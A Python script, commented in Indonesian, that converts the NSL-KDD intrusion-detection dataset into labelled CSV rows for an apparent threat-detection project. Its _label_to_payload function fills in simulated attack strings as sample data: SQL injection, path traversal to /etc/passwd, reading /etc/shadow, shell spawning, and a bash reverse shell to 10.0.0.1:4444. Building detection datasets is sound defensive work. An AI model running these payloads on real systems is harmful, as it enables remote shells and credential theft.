"""
data/convert_nslkdd.py
───────────────────────
Konverter NSL-KDD (.txt) → format CyberSentinel CSV.

Cara pakai:
    python data/convert_nslkdd.py KDDTrain+_20Percent.txt output.csv
    python data/convert_nslkdd.py KDDTrain+.txt output.csv
    python data/convert_nslkdd.py KDDTest+.txt output.csv
"""

import sys
import pandas as pd

# 41 kolom asli NSL-KDD (tanpa kolom difficulty di akhir)
KDD_COLUMNS = [
    "duration", "protocol_type", "service", "flag",
    "src_bytes", "dst_bytes", "land", "wrong_fragment", "urgent",
    "hot", "num_failed_logins", "logged_in", "num_compromised",
    "root_shell", "su_attempted", "num_root", "num_file_creations",
    "num_shells", "num_access_files", "num_outbound_cmds",
    "is_host_login", "is_guest_login", "count", "srv_count",
    "serror_rate", "srv_serror_rate", "rerror_rate", "srv_rerror_rate",
    "same_srv_rate", "diff_srv_rate", "srv_diff_host_rate",
    "dst_host_count", "dst_host_srv_count", "dst_host_same_srv_rate",
    "dst_host_diff_srv_rate", "dst_host_same_src_port_rate",
    "dst_host_srv_diff_host_rate", "dst_host_serror_rate",
    "dst_host_srv_serror_rate", "dst_host_rerror_rate",
    "dst_host_srv_rerror_rate",
    "label", "difficulty"
]

# Mapping label NSL-KDD → kategori ancaman CyberSentinel
LABEL_MAP = {
    "normal"        : "SAFE",
    "neptune"       : "DoS / DDoS Attack",
    "warezclient"   : "Data Exfiltration",
    "ipsweep"       : "Port Scan",
    "portsweep"     : "Port Scan",
    "teardrop"      : "DoS / DDoS Attack",
    "nmap"          : "Port Scan",
    "satan"         : "Port Scan",
    "smurf"         : "DoS / DDoS Attack",
    "pod"           : "DoS / DDoS Attack",
    "back"          : "DoS / DDoS Attack",
    "guess_passwd"  : "Brute Force",
    "ftp_write"     : "Brute Force",
    "multihop"      : "Brute Force",
    "rootkit"       : "Command Injection",
    "buffer_overflow": "Command Injection",
    "loadmodule"    : "Command Injection",
    "perl"          : "Command Injection",
    "spy"           : "Data Exfiltration",
    "phf"           : "Path Traversal",
    "warezmaster"   : "Data Exfiltration",
    "imap"          : "Brute Force",
    "land"          : "DoS / DDoS Attack",
    "apache2"       : "DoS / DDoS Attack",
    "mailbomb"      : "DoS / DDoS Attack",
    "processtable"  : "DoS / DDoS Attack",
    "udpstorm"      : "DoS / DDoS Attack",
    "httptunnel"    : "Data Exfiltration",
    "ps"            : "Command Injection",
    "sqlattack"     : "SQL Injection",
    "xterm"         : "Command Injection",
    "snmpgetattack" : "Port Scan",
    "snmpguess"     : "Brute Force",
    "worm"          : "DoS / DDoS Attack",
    "xsnoop"        : "Port Scan",
    "sendmail"      : "Brute Force",
    "named"         : "Brute Force",
}

# Mapping service NSL-KDD → port
SERVICE_PORT = {
    "http": 80, "https": 443, "ftp": 21, "ftp_data": 20,
    "smtp": 25, "ssh": 22, "telnet": 23, "dns": 53,
    "pop3": 110, "imap4": 143, "ldap": 389, "kerberos": 88,
    "mtp": 57, "bgp": 179, "finger": 79, "gopher": 70,
    "irc": 6667, "nntp": 119, "ntp_u": 123, "other": 0,
    "private": 0, "eco_i": 0, "ecr_i": 0, "red_i": 0,
    "urp_i": 0, "tim_i": 0, "rje": 77, "remote_job": 0,
    "supdup": 95, "name": 42, "whois": 43, "login": 513,
    "shell": 514, "printer": 515, "exec": 512, "time": 37,
    "discard": 9, "systat": 11, "daytime": 13, "netstat": 15,
    "efs": 520, "pm_dump": 0, "pop_2": 109, "pop_3": 110,
    "sunrpc": 111, "uucp": 540, "uucp_path": 117, "vmnet": 0,
    "Z39_50": 210, "X11": 6000, "urh_i": 0, "iso_tsap": 102,
    "csnet_ns": 105, "ctf": 84, "http_443": 443, "http_8001": 8001,
    "sql_net": 1521,
}


def convert(input_path: str, output_path: str):
    print(f"  Membaca: {input_path}")

    df = pd.read_csv(input_path, header=None, names=KDD_COLUMNS)
    print(f"  Loaded  : {len(df):,} baris")

    out = pd.DataFrame()
    out["src_ip"]       = [f"10.0.{i//256}.{i%256}" for i in range(len(df))]
    out["dst_ip"]       = "192.168.1.1"
    out["src_port"]     = df["src_bytes"].apply(lambda x: min(int(x) % 64512 + 1024, 65535))
    out["dst_port"]     = df["service"].map(SERVICE_PORT).fillna(0).astype(int)
    out["protocol"]     = df["protocol_type"].str.upper()
    out["packet_count"] = df["count"]
    out["byte_count"]   = df["src_bytes"] + df["dst_bytes"]
    out["duration"]     = df["duration"].apply(lambda x: max(float(x), 0.001))
    out["flag"]         = df["flag"]
    out["payload"]      = df["label"].map(
        lambda l: _label_to_payload(l)
    )
    out["label"]        = df["label"].map(lambda l: LABEL_MAP.get(l, "Unknown Attack"))

    out.to_csv(output_path, index=False)
    print(f"  Disimpan: {output_path}  ({len(out):,} baris)")

    # Statistik
    label_counts = out["label"].value_counts()
    print(f"\n  Distribusi label:")
    for label, count in label_counts.items():
        pct = count / len(out) * 100
        bar = "█" * int(pct / 2)
        print(f"    {label:<30} {count:>6,}  ({pct:5.1f}%)  {bar}")


def _label_to_payload(label: str) -> str:
    """Buat payload simulasi berdasarkan jenis serangan."""
    payloads = {
        "sqlattack"      : "GET /login?id=1' OR '1'='1",
        "phf"            : "GET /cgi-bin/phf?/../../../etc/passwd",
        "buffer_overflow": "$(python -c 'print(\"A\"*1000)')",
        "rootkit"        : "; cat /etc/shadow",
        "perl"           : "perl -e 'exec(\"/bin/sh\")'",
        "xterm"          : "xterm -display attacker:0",
        "loadmodule"     : "/bin/bash -i >& /dev/tcp/10.0.0.1/4444",
    }
    return payloads.get(label, "")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python data/convert_nslkdd.py <input.txt> <output.csv>")
        sys.exit(1)
    convert(sys.argv[1], sys.argv[2])
